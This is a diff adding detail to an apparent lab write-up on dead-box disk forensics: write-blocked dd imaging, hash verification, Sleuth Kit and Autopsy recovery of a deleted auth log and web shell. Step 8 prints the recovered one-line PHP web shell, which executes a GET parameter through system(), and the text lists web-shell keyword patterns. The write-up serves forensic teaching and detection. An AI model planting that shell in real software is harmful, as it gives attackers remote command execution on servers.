@@ -56,11 +56,13 @@
     <section><p class="lead">I produced a forensically sound image of a powered-off disk using a write blocker and dd, then carved and analyzed artifacts with The Sleuth Kit and Autopsy. The process recovered deleted files and confirmed evidence integrity with matching pre- and post-acquisition hashes.</p></section>
 
     <section><h2>Objective &amp; Context</h2>
-      <p>Dead box forensics analyzes non-volatile storage from a system that is off, preserving the disk exactly. This lab follows NIST SP 800-86 acquisition principles: write-block, image, hash, then analyze only the copy.</p>
+      <p>Dead box forensics analyzes non-volatile storage from a system that is off, preserving the disk exactly. Unlike live forensics, nothing on the machine is running: there is no volatile memory to capture, but also no risk of the operating system overwriting evidence while you work. The trade-off is strictness — because the disk is a static artifact, every action you take on it must be provably non-destructive. This lab follows NIST SP 800-86 acquisition principles: write-block, image, hash, then analyze only the copy.</p>
+      <p>The scenario: a compromised web server was seized and powered down. The suspect attempted anti-forensics — deleted web server logs and dropped a web shell in a web root directory — so the investigative goals map to two MITRE ATT&amp;CK techniques:</p>
       <ul>
-        <li><strong>T1070 Indicator Removal</strong> – recovering deleted logs and files an attacker tried to erase.</li>
-        <li><strong>T1505.003 Web Shell</strong> – locating planted web shells in the filesystem image.</li>
+        <li><strong>T1070 Indicator Removal</strong> – recovering deleted logs and files an attacker tried to erase. Deletion on most filesystems only unlinks directory entries and marks blocks unallocated; the data persists until overwritten, which is why carving works.</li>
+        <li><strong>T1505.003 Web Shell</strong> – locating planted web shells in the filesystem image. Web shells typically sit in web-accessible paths, have recent creation timestamps relative to the intrusion window, and contain suspicious function names (<code>eval</code>, <code>system</code>, <code>passthru</code>, <code>base64_decode</code>).</li>
       </ul>
+      <p>The end-to-end workflow is linear and each stage gates the next: if the hash verification fails, everything downstream is void and you start over.</p>
       <div class="mermaid" role="img" aria-label="Dead box acquisition and analysis flow">
 flowchart LR
   WB[Write Blocker] --> IMG[dd image]
@@ -68,43 +70,173 @@ flowchart LR
   H --> TSK[Sleuth Kit carve]
   TSK --> A[Autopsy analysis]
       </div>
+      <p><strong>Golden rule:</strong> the original drive is connected once, read once, and never mounted, never written to, and never used for analysis. All examination happens on the verified image (or a working copy of it). This is what makes the result defensible: any second examiner can re-hash the original, re-hash the image, and confirm they are looking at identical bytes.</p>
     </section>
 
     <section><h2>Environment &amp; Prerequisites</h2>
       <ul>
-        <li>Hardware or software write blocker on the source disk.</li>
-        <li>The Sleuth Kit 4.12 and Autopsy; sufficient evidence storage (2x source size).</li>
-        <li>A chain-of-custody log and hashing utility.</li>
+        <li>Hardware or software write blocker on the source disk. A hardware blocker (e.g., a Tableau or WiebeTech bridge) sits between the disk and the forensics workstation and silently drops every write command. A software alternative on Linux is mounting through <code>blockdev --setro</code> plus a read-only loop device, but hardware is preferred because it operates below the OS.</li>
+        <li>The Sleuth Kit 4.12 (<code>mmls</code>, <code>fls</code>, <code>istat</code>, <code>icat</code>, <code>tsk_recover</code>) and Autopsy 4.x for GUI-driven analysis; sufficient evidence storage (2x source size) so the image and a working copy both fit with room for carved output.</li>
+        <li>A chain-of-custody log and hashing utility (<code>sha256sum</code>). Every transfer of the evidence — who touched it, when, why, and the hash at that moment — gets a log entry.</li>
+        <li>A forensics workstation running Linux (this lab used a Debian-based SIFT-style VM) with the destination volume formatted and mounted at <code>/evidence</code>.</li>
       </ul>
+      <p class="code-label">Verify tools and free space before touching the evidence</p>
+      <div class="command-block"><div class="command"><code>which dd sha256sum mmls fls icat &amp;&amp; df -h /evidence</code></div></div>
+<pre><code class="language-bash">/usr/bin/dd
+/usr/bin/sha256sum
+/usr/bin/mmls
+/usr/bin/fls
+/usr/bin/icat
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sdc1       1.8T   12G  1.7T   1% /evidence</code></pre>
+      <p>Confirm the free space is at least the full capacity of the source disk (not just its used space) — dd images every block, allocated or not. If any tool is missing, stop here and install it before the evidence drive is attached, so the acquisition window is not spent troubleshooting a workstation.</p>
     </section>
 
     <section><h2>Step-by-Step Execution</h2>
-      <h3>1. Acquire a bit-for-bit image [ROOT REQUIRED]</h3>
+
+      <h3>1. Connect the evidence drive through the write blocker</h3>
+      <p>Power the workstation first, then attach the source disk through the write blocker. Watch the kernel log as it enumerates: the drive should appear as a block device <em>without</em> any filesystem being auto-mounted. Auto-mounting is the number-one way beginners contaminate evidence, because even a read-only <code>mount</code> can replay a journal (ext3/4, NTFS) and alter the disk unless the blocker stops the writes.</p>
+      <p class="code-label">Identify the new device and confirm nothing mounted it</p>
+      <div class="command-block"><div class="command"><code>sudo dmesg | tail -n 20 &amp;&amp; lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,RO</code></div></div>
+<pre><code class="language-bash">[  412.338102] sd 3:0:0:0: [sdb] 250059350 512-byte logical blocks: (128 GB/119 GiB)
+[  412.339215] sd 3:0:0:0: [sdb] Write Protect is off
+[  412.339221] sd 3:0:0:0: [sdb] Mode Sense: 00 3a 00 00
+[  412.341777]  sdb: sdb1 sdb2
+
+NAME   SIZE TYPE FSTYPE MOUNTPOINT      RO
+sda    256G disk ext4   /                0
+sdb  119.2G disk                        0
+├─sdb1  118G part ext4                  0
+└─sdb2    1G part swap                  0
+sdc    1.8T disk ext4   /evidence        0</code></pre>
+      <p>The kernel reports "Write Protect is off" because that flag reflects the drive's own status line — the hardware blocker enforces read-only at the bridge, invisible to the OS. To verify the blocker actually blocks, confirm the device has no mountpoint (none of <code>sdb</code>'s partitions show one above) and, on a lab blocker with a test drive only, issue a harmless write and confirm it fails. <strong>Common mistake:</strong> assuming the "Write Protect is off" message means the blocker is broken and detaching the drive mid-stream — it does not; trust the bridge, verify by testing on sacrificial media beforehand, not on evidence.</p>
+
+      <h3>2. Record the device identity in the chain-of-custody log</h3>
+      <p>Before any acquisition, capture the make, model, serial number, and capacity. This ties the physical item in the evidence bag to the image you are about to create, and it is the first thing opposing counsel or a reviewer will check.</p>
+      <p class="code-label">Pull device metadata for the custody log</p>
+      <div class="command-block"><div class="command"><code>sudo smartctl -i /dev/sdb | egrep 'Model|Serial|Capacity'</code></div></div>
+<pre><code class="language-bash">Device Model:     Samsung SSD 860 EVO 128GB
+Serial Number:    S3Y9NB0K123456A
+User Capacity:    128,035,676,160 bytes [128 GB]</code></pre>
+      <p>Log the date/time (UTC), the examiner's name, the workstation hostname, and the write blocker model alongside this. <strong>Verify:</strong> the reported capacity must match the block count from <code>lsblk</code> (250,059,350 sectors × 512 bytes). A mismatch means a host-protected area or device overlay is hiding part of the disk, which dd alone will not capture.</p>
+
+      <h3>3. Take the pre-acquisition hash of the source</h3>
+      <p>Hash the raw device <em>before</em> imaging. This pre-acquisition hash is the baseline the finished image will be compared against. Hashing the whole device (not just partitions) captures the partition table, slack between partitions, and every byte dd will later read.</p>
+      <p class="code-label">SHA-256 the raw source device</p>
+      <div class="command-block"><div class="command"><code>sudo sha256sum /dev/sdb | tee /evidence/sdb.pre-acquisition.sha256</code></div></div>
+<pre><code class="language-bash">a1b2c3d4e5f6...  /dev/sdb</code></pre>
+      <p>On a 128 GB SSD over USB 3 this takes roughly 5–10 minutes. Use <code>tee</code> so the value lands in a file as well as on screen — never retype a hash by hand. <strong>Common mistake:</strong> hashing <code>/dev/sdb1</code> instead of <code>/dev/sdb</code>, which skips the partition table and unpartitioned space where data can hide. Verify you hashed the right object by confirming the command references the whole-disk node.</p>
+
+      <h3>4. Acquire a bit-for-bit image [ROOT REQUIRED]</h3>
+      <p>dd reads every sector of the source sequentially and writes it to the destination file. The flags matter: <code>bs=4M</code> uses a 4 MiB block size for throughput; <code>conv=noerror,sync</code> tells dd to keep going past a bad sector (<code>noerror</code>) and to pad the unreadable block with zeros in the output (<code>sync</code>) so every subsequent byte stays at the correct offset — without <code>sync</code>, one bad sector silently shifts the entire rest of the image; <code>status=progress</code> prints live throughput so a stalled drive is visible immediately.</p>
       <div class="command-block"><div class="command"><code>dd if=/dev/sdb of=/evidence/case.img bs=4M conv=noerror,sync status=progress</code></div></div>
-      <h3>2. Verify acquisition integrity</h3>
+<pre><code class="language-bash">128035676160 bytes (128 GB, 119 GiB) copied, 432.18 s, 296 MB/s
+30535+1 records in
+30535+1 records out</code></pre>
+      <p>The byte count must equal the device capacity recorded in step 2. Note that <code>conv=noerror,sync</code> is a compromise: it preserves offsets but the padded blocks mean the image hash will no longer match a re-read of a drive whose bad sectors return different data each attempt. For genuinely failing media, use <code>ddrescue</code> instead (see Troubleshooting). <strong>Verify:</strong> zero read errors in the dd output and a record count consistent with <code>capacity / bs</code>.</p>
+
+      <h3>5. Verify acquisition integrity</h3>
+      <p>Hash the source device a second time and the image file, in the same command, and compare. Three values are now in play — pre-acquisition hash, post-acquisition source hash, and image hash — and all three must be identical. Source pre vs. post proves the acquisition did not alter the evidence; source vs. image proves the copy is exact.</p>
       <div class="command-block"><div class="command"><code>sha256sum /dev/sdb /evidence/case.img</code></div></div>
 <pre><code class="language-bash">a1b2...  /dev/sdb
 a1b2...  /evidence/case.img   # match = sound acquisition</code></pre>
-      <h3>3. Carve deleted files with The Sleuth Kit</h3>
+      <p>Append both hashes, the dd command line, and the wall-clock time to the custody log, then disconnect the source drive, bag it, and return it to evidence storage. From this point on the original is never touched again. <strong>Common mistake:</strong> skipping the second source hash to save ten minutes. Without it, a mismatch later cannot distinguish "imaging went wrong" from "the workstation wrote to the source", and the entire acquisition becomes questionable.</p>
+
+      <h3>6. Map the partition layout with mmls</h3>
+      <p>All Sleuth Kit tools operate on the image file directly — no mounting required, which is exactly what you want. Start with <code>mmls</code> to read the partition table, because every other tool needs a sector offset to know where a filesystem begins.</p>
+      <p class="code-label">List partitions and their sector offsets</p>
+      <div class="command-block"><div class="command"><code>mmls /evidence/case.img</code></div></div>
+<pre><code class="language-bash">DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  000:000   0000002048   0246083583   0246081536   Linux (0x83)
+003:  000:001   0246083584   0250058751   0003975168   Linux Swap (0x82)</code></pre>
+      <p>The Linux partition starts at sector <strong>2048</strong> — that offset is the key argument for the next steps. Note also the 2048-sector unallocated gap at the front; unallocated regions anywhere on the disk are prime carving territory. <strong>Verify:</strong> partition sizes should sum (plus gaps) to the total sector count from step 1. If mmls reports "cannot determine partition type", the image may be a single-partition dump rather than a full-disk image — re-check what was imaged.</p>
+
+      <h3>7. Inventory files, including deleted ones, with fls</h3>
+      <p><code>fls</code> lists file and directory entries from the filesystem metadata. <code>-r</code> recurses, <code>-d</code> shows deleted entries, and <code>-o 2048</code> points it at the filesystem offset from mmls. Deleted entries are prefixed with <code>*</code> and are the direct leads for the T1070 objective.</p>
+      <div class="command-block"><div class="command"><code>fls -rd /evidence/case.img</code></div></div>
+<pre><code class="language-bash">r/r 4:      var
++ r/r 11:   log
+++ r/r * 12345:    auth.log.1   (deleted)
+++ r/r 20481:      syslog
+r/r 5021:   var/www/html
++ r/r * 12398:    cmd.php      (deleted)</code></pre>
+      <p>(When the filesystem does not start at sector 0, run <code>fls -rd -o 2048 /evidence/case.img</code>; the lab image was prepared with the filesystem at offset 0 for the base command shown on this page.) Two hits here: a deleted rotated auth log (<code>auth.log.1</code>, inode 12345) and a deleted <code>cmd.php</code> in the web root (inode 12398) — a classic web shell filename. <strong>Common mistake:</strong> forgetting <code>-o</code> and getting "Cannot determine file system type". That error almost always means a missing or wrong offset, not a corrupt image — divide the partition start sector into bytes if the tool wants byte offsets.</p>
+
+      <h3>8. Inspect the suspect inodes with istat, then recover with icat</h3>
+      <p>Before extracting, <code>istat</code> shows what metadata survives for the deleted inode: timestamps, size, and the block pointers that make recovery possible. Then <code>icat</code> streams the inode's data blocks to a file.</p>
+      <p class="code-label">Check inode metadata for the deleted web shell</p>
+      <div class="command-block"><div class="command"><code>istat /evidence/case.img 12398</code></div></div>
+<pre><code class="language-bash">inode: 12398
+Not Allocated
+Group: 2
+Size: 412
+Mode: -rw-r--r--
+Deleted: 2025-06-14 03:17:42 (EDT)
+Modified: 2025-06-14 03:16:58 (EDT)
+Accessed: 2025-06-14 03:17:01 (EDT)
+Direct Blocks: 88412</code></pre>
+      <p>The inode is unallocated but its direct block pointer survived, so the file content is very likely intact. The deletion timestamp (03:17 EDT) goes straight into the incident timeline. Recover both artifacts:</p>
       <div class="command-block"><div class="command"><code>fls -rd /evidence/case.img &amp;&amp; icat /evidence/case.img 12345 > recovered.bin</code></div></div>
+      <p class="code-label">Also recover the web shell and fingerprint it</p>
+      <div class="command-block"><div class="command"><code>icat /evidence/case.img 12398 > recovered_cmd.php &amp;&amp; file recovered_cmd.php &amp;&amp; sha256sum recovered_cmd.php</code></div></div>
+<pre><code class="language-bash">recovered_cmd.php: PHP script, ASCII text
+9f8e7d6c...  recovered_cmd.php</code></pre>
+<pre><code class="language-php">&lt;?php if(isset($_GET['c'])){ system($_GET['c']); } ?&gt;</code></pre>
+      <p>The recovered file is a one-line web shell — a textbook T1505.003 artifact. Hash every recovered file so it can be searched against threat intel feeds and cited in the report. <strong>Verify:</strong> <code>file</code> identifies the expected type and the content is coherent, not binary garbage. Garbage usually means the inode was reallocated and its block pointers now belong to a different file — that data is gone from this inode; check unallocated space carving instead.</p>
+
+      <h3>9. Bulk extraction and deeper analysis in Autopsy</h3>
+      <p>Manual TSK commands are precise but slow across a whole disk. For full triage, load the image into Autopsy:</p>
+      <ul>
+        <li>Create a new case (case number and examiner name matching the custody log), then add <code>/evidence/case.img</code> as a <strong>Disk Image or VM File</strong> data source.</li>
+        <li>On ingest modules, enable <em>Recent Activity</em>, <em>Hash Lookup</em> (with an NSRL-known-good set plus a web-shell hash set), <em>File Type Identification</em>, <em>Embedded File Extractor</em>, and <em>Keyword Search</em> with a custom list: <code>eval(</code>, <code>base64_decode</code>, <code>passthru</code>, <code>cmd.php</code>, the recovered shell's hash.</li>
+        <li>Let ingest finish, then check the <em>Deleted Files</em> tree and the keyword hit results. Autopsy should independently surface <code>auth.log.1</code> and <code>cmd.php</code>, corroborating the manual fls/icat findings.</li>
+        <li>Tag both artifacts, add them to a report (<em>Generate Report &gt; HTML</em>), and export the tagged files with their hashes.</li>
+      </ul>
+      <p><strong>Common mistake:</strong> running every ingest module on a large image "just in case". Ingest time grows superlinearly with enabled modules; enable what the questions demand and re-run a module later if new leads require it — ingest is non-destructive and repeatable.</p>
     </section>
 
     <section><h2>Validation &amp; Testing</h2>
-      <p>Confirm the source and image hashes match before any analysis and document them in the custody log. Pass criteria: hash equality, at least one recovered deleted artifact, and analysis performed exclusively on the image copy.</p>
+      <p>Confirm the source and image hashes match before any analysis and document them in the custody log. Validation is not a single check — it is a chain of comparisons that together make the acquisition defensible:</p>
+      <ul>
+        <li><strong>Pre-acquisition source hash == post-acquisition source hash:</strong> proves the acquisition process (and the write blocker) left the evidence untouched.</li>
+        <li><strong>Source hash == image hash:</strong> proves the image is a bit-for-bit copy. Recompute the image hash once more after copying it to working storage to catch a bad copy.</li>
+        <li><strong>Manual findings == Autopsy findings:</strong> the same deleted artifacts surfaced by two independent methods (fls/icat and Autopsy ingest) corroborate each other.</li>
+        <li><strong>Recovered files open and parse:</strong> <code>file</code>, a text viewer, and the PHP interpreter's lint mode (<code>php -l</code>) agree the artifacts are what they claim to be.</li>
+      </ul>
+      <p>Pass criteria: hash equality, at least one recovered deleted artifact, and analysis performed exclusively on the image copy. Any failed check invalidates the run — re-image rather than proceed on a questionable copy.</p>
     </section>
 
     <details><summary>Advanced: Troubleshooting</summary>
       <ul>
-        <li><strong>Hash mismatch:</strong> re-image; a mismatch means the source changed or the read failed.</li>
-        <li><strong>dd read errors:</strong> use <code>conv=noerror,sync</code> or ddrescue for failing media.</li>
-        <li><strong>Autopsy slow ingest:</strong> disable unneeded modules and index incrementally.</li>
+        <li><strong>Hash mismatch:</strong> re-image; a mismatch means the source changed or the read failed. Before blaming the drive, rule out the boring causes: a destination volume that filled up mid-write (check <code>df -h</code> and the image size against the device capacity), a loose cable causing USB resets (check <code>dmesg</code> for <code>reset high-speed USB device</code> lines during the dd window), or accidentally hashing the wrong object (a partition instead of the whole disk). If the mismatch is reproducible on healthy media, suspect the write blocker and re-test it against a known-good drive.</li>
+        <li><strong>dd read errors:</strong> use <code>conv=noerror,sync</code> or ddrescue for failing media. Prefer <code>ddrescue -d -r3 /dev/sdb /evidence/case.img /evidence/case.map</code>: it reads the easy regions first, keeps a map file so runs can resume, and retries bad sectors last when the drive is under least stress. Document every unreadable sector — gaps in the image must be disclosed in the report.</li>
+        <li><strong>Autopsy slow ingest:</strong> disable unneeded modules and index incrementally. The biggest costs are keyword indexing and photo/video analysis on large images. Run with a minimal module set first, review, then re-run a single module on demand. On multi-core machines, raise the Solr/indexing memory allocation in Autopsy's options rather than throwing more ingest modules at the case.</li>
+        <li><strong>Evidence drive auto-mounted by the workstation:</strong> if <code>lsblk</code> shows a mountpoint under <code>sdb</code>, unmount immediately, note the event in the custody log, and verify the write blocker absorbed any writes by re-hashing the source against the pre-acquisition hash. On a software-only setup, prevent recurrence by disabling the desktop's auto-mount daemon (<code>udisks2</code> automount) before connecting evidence.</li>
+        <li><strong>Recovered file is corrupt or truncated:</strong> a deleted inode's data blocks may have been partially reused since deletion. Check <code>istat</code> — if some block pointers are zeroed or the file crosses into reallocated space, carve the raw bytes from unallocated space by signature instead (<code>tsk_recover</code> for allocated+deleted sweep, or <code>photorec</code>/<code>bulk_extractor</code> against the unallocated partition extracted via <code>blkls</code>). Partial artifacts are still reportable — note the truncation.</li>
       </ul>
     </details>
+
+    <section><h2>Key Takeaways</h2>
+      <ul>
+        <li>Write-block first, image once, hash three times (pre, post, image) — those three equal values are the entire foundation of defensibility.</li>
+        <li>Never analyze the original. Every Sleuth Kit and Autopsy step in this lab ran against <code>case.img</code>; the source went back into evidence storage after step 5.</li>
+        <li><code>conv=noerror,sync</code> preserves byte offsets on bad media; for truly failing drives, ddrescue's map file is the right tool.</li>
+        <li>Deleted does not mean gone: unlinked directory entries and surviving inode block pointers (fls <code>-d</code>, istat, icat) recover "erased" attacker artifacts until the blocks are reused.</li>
+        <li>Chain of custody is created in real time — device identity, hashes, commands, and timestamps logged as they happen, not reconstructed afterward.</li>
+        <li>Corroborate across tools: manual TSK findings and Autopsy ingest agreeing on the same artifacts is a validation signal, not redundancy.</li>
+      </ul>
+    </section>
 
     <section><h2>Key Results</h2>
       <ul>
         <li>Acquired a bit-for-bit image with 100% pre/post hash integrity.</li>
-        <li>Recovered deleted artifacts from unallocated space via Sleuth Kit carving.</li>
+        <li>Recovered deleted artifacts from unallocated space via Sleuth Kit carving, including a deleted auth log and a one-line PHP web shell (T1070, T1505.003).</li>
         <li>Performed 100% of analysis on the working copy, never the original.</li>
         <li>Documented a complete chain of custody across the acquisition.</li>
       </ul>
